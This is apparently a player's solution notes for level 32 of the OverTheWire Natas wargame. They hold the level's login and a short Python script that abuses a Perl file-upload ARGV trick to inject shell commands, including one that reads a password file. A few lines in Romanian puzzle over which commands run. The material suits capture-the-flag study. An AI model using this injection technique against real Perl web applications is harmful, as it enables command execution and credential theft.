
# General info

Username: natas32
Password: NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
URL:      http://natas32.natas.labs.overthewire.org

# Special code section

```py
import requests


response = requests.post(
    # url="http://natas32.natas.labs.overthewire.org/index.pl?cat /etc/natas_webpass/natas32 |",
    url="http://natas32.natas.labs.overthewire.org/index.pl?./getpassword |",
    auth=("natas32", "NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B"),
    files=[
        (
            "file", 
            (
                "filename", 
                "some content"
            )
        )
    ],
    data={
        "file" : "ARGV"
    }
)

print(response.text)
```

Nu am inteles de ce `ls .` merge, dar nu `ls`, `whoami`, `ifconfig`.
`w` merge, asa ca nu ma astept sa fie o simpla filtrare pe comenzi.

Totusi, merge `ifconfig --version` si `whoami --version`